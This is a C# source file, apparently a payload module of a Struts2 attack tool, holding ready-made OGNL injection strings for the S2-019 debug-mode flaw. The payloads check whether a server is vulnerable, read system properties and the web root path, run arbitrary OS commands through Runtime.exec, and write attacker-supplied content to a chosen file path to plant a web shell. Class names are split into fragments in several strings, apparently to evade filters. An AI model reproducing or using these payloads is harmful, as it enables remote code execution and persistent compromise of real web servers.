using System;
using System.Collections.Generic;
using System.Text;

namespace payload
{
    public class S2019:BasePayload
    {
        private String Exp_Check = "debug=command&expression=%23req%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27%29,%23resp%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27%29,%23resp.setCharacterEncoding%28%27UTF-8%27%29,%23resp.getWriter%28%29.print%28%22struts2_security_%22%29,%23resp.getWriter%28%29.print%28%22check%22%29,%23resp.getWriter%28%29.flush%28%29,%23resp.getWriter%28%29.close%28%29";
        private String Exp_VerInfo = "debug=command&expression=%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27%29,%23resp%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27%29,%23resp.setCharacterEncoding%28%27UTF-8%27%29,%23resp.getWriter%28%29.print%28%22[vername]:%22%29,%23resp.getWriter%28%29.print%28@java.lang.System@getProperty%28%22[vername]%22%29%29,%23resp.getWriter%28%29.flush%28%29,%23resp.getWriter%28%29.close%28%29";
        private String Exp_Path= "debug=command&expression=%23req%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27%29,%23resp%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27%29,%23resp.setCharacterEncoding%28%27UTF-8%27%29,%23resp.getWriter%28%29.print%28%22web%22%29,%23resp.getWriter%28%29.print%28%22path:%22%29,%23resp.getWriter%28%29.print%28%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%22/%22%29%29,%23resp.getWriter%28%29.flush%28%29,%23resp.getWriter%28%29.close%28%29";
        //部分情况获取不到结果
        //private String Exp_Exec = "debug=command&expression=%23req%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27%29,%23s%3dnew%20java.util.Scanner%28%28new%20java.lang.ProcessBuilder%28%22[cmd]%22%29%29.start%28%29.getInputStream%28%29%29.useDelimiter%28%27\\\\AAAA%27%29,%23str%3d%23s.hasNext%28%29?%23s.next%28%29:%27%27,%23resp%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27%29,%23resp.setCharacterEncoding%28%27UTF-8%27%29,%23resp.getWriter%28%29.println%28%23str%29,%23resp.getWriter%28%29.flush%28%29,%23resp.getWriter%28%29.close%28%29";
        private String Exp_Exec = "debug=command&expression=%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27%29,%23resp%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27%29,%23resp.setCharacterEncoding%28%27UTF-8%27%29,%23resp.getWriter%28%29.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%22[cmd]%22%29.getInputStream%28%29%29%29,%23resp.getWriter%28%29.flush%28%29,%23resp.getWriter%28%29.close%28%29";
        private String Exp_Upload = "debug=command&expression=%23req%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29,%23res%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23res.getWriter%28%29.print%28%22oko%22%29,%23res.getWriter%28%29.print%28%22kok/%22%29,%23res.getWriter%28%29.print%28%23req.getContextPath%28%29%29,%23res.getWriter%28%29.flush%28%29,%23res.getWriter%28%29.close%28%29,new+java.io.BufferedWriter%28new+java.io.FileWriter%28%27[path]%27%29%29.append%28%23req.getParameter%28%22shell%22%29%29.close%28%29&shell=[filecontent]";
        private String Exp_SetMyUpload = "debug=command&expression=%23req%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29,%23res%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23res.getWriter%28%29.print%28%22oko%22%29,%23res.getWriter%28%29.print%28%22kok/%22%29,%23res.getWriter%28%29.print%28%23req.getContextPath%28%29%29,%23res.getWriter%28%29.flush%28%29,%23res.getWriter%28%29.close%28%29,new+java.io.File%28%27[path]%27%29.mkdirs%28%29,new+java.io.BufferedWriter%28new+java.io.FileWriter%28%27[pathfilename]%27%29%29.append%28%23req.getParameter%28%22shell%22%29%29.close%28%29&shell=[filecontent]";

        
        public String Get_Exp_Check()
        {
            return this.Exp_Check;
        }
        public String Get_Exp_VerInfo(String vername)
        {
            return this.Exp_VerInfo.Replace("[vername]",vername); ;
        }
        public String Get_Exp_Path() {
            return this.Exp_Path;
        }
        public String Get_Exp_Exec(String cmd)
        {
            return this.Exp_Exec.Replace("[cmd]",cmd);
        }
        public String Get_Exp_Upload(String path,String fileName,String fileContent)
        {
            if ("".Equals(path))
            {
                this.Exp_Upload = this.Exp_Upload.Replace("[pathfilename]", fileName);
                return this.Exp_Upload.Replace("[filecontent]", fileContent);
            }
            else {
                this.Exp_SetMyUpload = this.Exp_SetMyUpload.Replace("[path]", path);
                this.Exp_SetMyUpload = this.Exp_SetMyUpload.Replace("[pathfilename]", path+"/"+ fileName);
                return this.Exp_SetMyUpload.Replace("[filecontent]", fileContent);
            }
            
        }
    }
}
